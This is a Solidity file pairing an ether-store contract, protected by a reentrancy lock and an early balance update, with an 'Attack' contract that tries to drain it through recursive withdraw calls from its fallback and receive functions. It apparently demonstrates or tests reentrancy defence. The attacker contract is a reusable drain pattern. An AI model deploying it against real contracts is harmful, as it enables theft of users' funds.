// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract A {
    mapping(address => uint256) public balances;
    bool internal locked;

    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public payable nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        balances[msg.sender] -= _amount;
        
        (bool send, ) = msg.sender.call{value: _amount}("");
        require(send, "Failed to send ether");
    }
}

contract Attack {
    A public ethStore;

    address public owner;

    constructor(address _ethStore) {
        ethStore = A(_ethStore);
        owner = msg.sender;
    }

    fallback() external payable {
        if (address(ethStore).balance >= 1 ether) {
            ethStore.withdraw(1 ether);
        }
    }

    receive() external payable {
        if (address(ethStore).balance >= 1 ether) {
            ethStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "less amount");
        // deposit ether
        ethStore.deposit{value: 1 ether}();

        ethStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getFunds() public {
        require(msg.sender == owner, "Access denied");
        uint256 bal = address(this).balance;
        (bool send, ) = msg.sender.call{value: bal}("");
        require(send, "Failed to send ether");
    }
}
